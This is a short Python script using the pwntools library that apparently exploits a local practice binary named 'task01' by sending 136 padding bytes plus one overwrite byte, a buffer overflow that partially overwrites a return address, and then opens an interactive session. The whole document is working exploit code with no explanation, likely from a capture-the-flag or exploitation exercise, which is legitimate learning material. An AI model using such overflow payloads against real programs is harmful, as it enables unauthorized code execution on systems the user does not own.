from pwn import *

io = process("./task01")

print(io.recvline())

io.send(b'A' * 136 + b'\x40')

io.interactive()
